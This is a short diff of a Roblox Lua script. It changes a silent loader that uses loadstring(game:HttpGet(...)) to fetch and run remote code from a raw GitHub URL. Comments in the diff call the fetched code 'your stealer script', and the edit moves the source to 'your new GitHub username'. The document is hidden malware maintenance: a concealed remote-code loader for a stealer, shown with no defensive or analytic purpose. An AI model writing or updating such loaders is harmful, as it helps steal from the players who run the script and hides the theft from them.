@@ -4,6 +4,6 @@ pcall(function()
 end)
 
 pcall(function()
-    -- Load your stealer script silently
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/danielkrupenski/NoLag/main/NoLag"))()
+    -- Load your stealer script from your new GitHub username
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/HKTwoScript/NoLag/main/NoLag"))()
 end)
